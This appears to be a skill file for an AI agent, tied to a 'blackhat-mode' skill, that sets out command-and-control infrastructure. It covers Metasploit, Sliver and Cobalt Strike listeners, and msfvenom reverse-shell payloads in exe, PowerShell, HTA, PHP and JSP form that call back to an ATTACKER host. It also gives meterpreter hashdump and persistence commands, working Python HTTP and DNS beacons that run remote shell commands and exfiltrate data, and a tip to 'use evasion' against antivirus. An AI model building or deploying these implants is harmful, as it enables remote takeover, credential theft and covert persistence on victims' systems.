---
name: c2-tools
description: "C2 infrastructure — Metasploit, Sliver, Cobalt Strike, custom C2."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [c2, metasploit, sliver, cobalt, beacon, listener, payload]
    related_skills: [blackhat-mode, post-tools, stealth-tools]
prerequisites:
  commands: [python]
---

# C2 Infrastructure Tools

## When to Load This Skill

User requests:
- "C2", "beacon", "listener", "payload", "meterpreter"

---

## Metasploit

### Setup

```bash
# Start
msfconsole

# Database
msfdb init
msfdb status
```

### Listeners

```bash
# Multi handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER
set LPORT 4444
exploit

# One liner
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ATTACKER; set LPORT 4444; exploit"
```

### Payloads

```bash
# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f psh -o shell.ps1
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o shell.hta

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf

# Web
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.jsp
```

### Meterpreter

```bash
# System
sysinfo
getuid
getpid

# File system
ls
cd
pwd
download file.txt
upload shell.exe

# Network
ipconfig
route
netstat

# Privilege escalation
getsystem
hashdump

# Persistence
run persistence -U -i 5 -p 4444 -r ATTACKER
```

---

## Sliver

### Setup

```bash
# Start
sliver-server

# Generate
generate --os windows --arch amd64 --lhost ATTACKER --lport 4444 --save shell.exe

# Listener
mtls --lhost 0.0.0.0 --lport 8888

# Interactive session
sessions
use SESSION_ID
```

### Commands

```bash
# System
sysinfo
getpid
whoami

# File system
ls
cd
download file.txt
upload shell.exe

# Execute
execute shell.exe
shell

# Privilege
getsystem
impersonate --token-id 1234
```

---

## Cobalt Strike

### Setup

```bash
# Start teamserver
./teamserver IP PASSWORD

# Start client
./cobaltstrike
```

### Listeners

```bash
# HTTP
Listeners > Add > HTTP
Host: ATTACKER
Port: 80

# DNS
Listeners > Add > DNS
DNS Host: ATTACKER
```

### Payloads

```bash
# Generate
Attacks > Packages > HTML Application
Attacks > Packages > Windows Executable (S)

# Stager
Attacks > Web Drive-by > Scripted Web Delivery
```

---

## Custom C2

### HTTP C2

```python
import requests
import base64
import time

class C2Client:
    def __init__(self, server):
        self.server = server
        self.id = base64.b64encode(os.urandom(16)).decode()
    
    def get_task(self):
        r = requests.get(f"{self.server}/task?id={self.id}")
        return base64.b64decode(r.text)
    
    def send_result(self, result):
        data = base64.b64encode(result.encode()).decode()
        requests.post(f"{self.server}/result", data={'id': self.id, 'result': data})
    
    def loop(self):
        while True:
            task = self.get_task()
            if task:
                result = self.execute(task)
                self.send_result(result)
            time.sleep(5)
    
    def execute(self, task):
        import subprocess
        return subprocess.check_output(task, shell=True).decode()
```

### DNS C2

```python
import dns.resolver
import base64

class DNSC2:
    def __init__(self, domain):
        self.domain = domain
    
    def get_task(self):
        query = f"task.{self.domain}"
        try:
            result = dns.resolver.resolve(query, 'A')
            return base64.b32decode(result[0].to_text())
        except:
            return None
    
    def send_result(self, result):
        encoded = base64.b32encode(result.encode()).decode()
        # Exfiltrate via DNS queries
        for i in range(0, len(encoded), 63):
            chunk = encoded[i:i+63]
            query = f"{chunk}.{self.domain}"
            dns.resolver.resolve(query, 'A')
```

---

## Python C2 Tools

### C2 Server

```python
from flask import Flask, request
import base64
import uuid

app = Flask(__name__)
clients = {}

@app.route('/task')
def get_task():
    client_id = request.args.get('id')
    if client_id in clients:
        task = clients[client_id].get('task', '')
        return base64.b64encode(task.encode()).decode()
    return ''

@app.route('/result', methods=['POST'])
def send_result():
    client_id = request.form.get('id')
    result = base64.b64decode(request.form.get('result')).decode()
    print(f"[{client_id}] {result}")
    return 'OK'

@app.route('/register')
def register():
    client_id = str(uuid.uuid4())
    clients[client_id] = {'task': None}
    return client_id

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

### Beacon

```python
import requests
import base64
import time
import subprocess

class Beacon:
    def __init__(self, server):
        self.server = server
        self.id = requests.get(f"{server}/register").text
    
    def get_task(self):
        r = requests.get(f"{self.server}/task?id={self.id}")
        if r.text:
            return base64.b64decode(r.text).decode()
        return None
    
    def send_result(self, result):
        data = base64.b64encode(result.encode()).decode()
        requests.post(f"{self.server}/result", data={'id': self.id, 'result': data})
    
    def run(self):
        while True:
            task = self.get_task()
            if task:
                try:
                    result = subprocess.check_output(task, shell=True, timeout=30).decode()
                except Exception as e:
                    result = str(e)
                self.send_result(result)
            time.sleep(10)
```

---

## Output Format

```json
{
  "c2": "Metasploit",
  "listeners": [
    {"type": "reverse_tcp", "host": "ATTACKER", "port": 4444}
  ],
  "beacons": [
    {"id": "abc123", "host": "TARGET", "user": "SYSTEM", "os": "Windows"}
  ]
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Connection refused | C2 down | Check server |
| Session lost | Network issue | Reconnect |
| Payload blocked | AV detected | Use evasion |
| BEACON blocked | Network filter | Use different protocol |
